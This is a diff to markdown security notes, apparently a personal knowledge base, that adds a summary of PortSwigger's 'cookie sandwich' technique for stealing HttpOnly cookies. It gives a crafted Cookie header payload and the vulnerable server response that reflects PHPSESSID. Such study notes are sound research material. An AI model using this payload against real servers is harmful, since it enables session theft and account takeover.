@@ -13,3 +13,24 @@ When a [Cross-Site Scripting (XSS)](Cross-Site%20Scripting%20(XSS).md) and an [I
 
 ## Cookie Eviction
 ![Cookie Eviction](Cookie%20Eviction.md)
+
+## Cookie Sandwich Attack
+
+![The Concept](../../Readwise/Articles/PortSwigger%20Research%20-%20Stealing%20HttpOnly%20Cookies%20With%20the%20Cookie%20Sandwich%20Technique.md#The%20Concept)
+
+**The Malicious Request Header:**
+
+```HTTP
+GET /json?session=ignored HTTP/1.1
+Cookie: $Version=1; session="deadbeef; PHPSESSID=secret; dummy=qaz"
+```
+
+**The Vulnerable Server Response:** Because the server interprets everything inside the quotes as the `session` value, it reflects the sensitive `PHPSESSID` in the JSON body:
+
+```json
+{"session":"deadbeef; PHPSESSID=secret; dummy=qaz"}
+```
+
+The attacker's script then reads this response text and exfiltrates the `PHPSESSID`.
+
+More details in [PortSwigger Research - Stealing HttpOnly Cookies With the Cookie Sandwich Technique](../../Readwise/Articles/PortSwigger%20Research%20-%20Stealing%20HttpOnly%20Cookies%20With%20the%20Cookie%20Sandwich%20Technique.md)
